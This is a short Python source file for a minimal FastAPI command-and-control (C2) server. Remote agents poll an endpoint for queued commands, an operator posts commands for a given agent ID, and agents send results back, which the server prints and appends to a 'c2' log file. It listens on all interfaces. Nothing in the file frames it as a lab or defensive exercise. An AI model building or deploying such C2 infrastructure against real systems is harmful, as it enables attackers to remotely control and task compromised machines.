
from fastapi import FastAPI, Request
import uvicorn
import datetime

app = FastAPI()
commands = {}

@app.get("/cmd")
def get_command(agent_id: str):
    return commands.get(agent_id, {"cmd": "noop"})

@app.post("/send")
async def send_command(req: Request):
    data = await req.json()
    commands[data["agent_id"]] = data
    return {"status": "sent"}

@app.post("/output")
async def get_output(req: Request):
    data = await req.json()
    agent_id = data.get("agent_id", "unknown")
    result = data.get("result", "")
    print(f"Output from {data['agent_id']}: {data['result']}")
    # Save to log file for report
    log_agent_command(f"{agent_id}: {result}")
    return {"status": "received"}

def log_agent_command(cmd_result):
    app_name = "agent"
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M")
    log_path = f"output/{app_name}_agent_c2_log.txt"
    with open(log_path, "a") as log_file:
        log_file.write(f"[{timestamp}] {cmd_result}\n")

if __name__ == "__main__":
    uvicorn.run("app:app", host="0.0.0.0", port=8080)
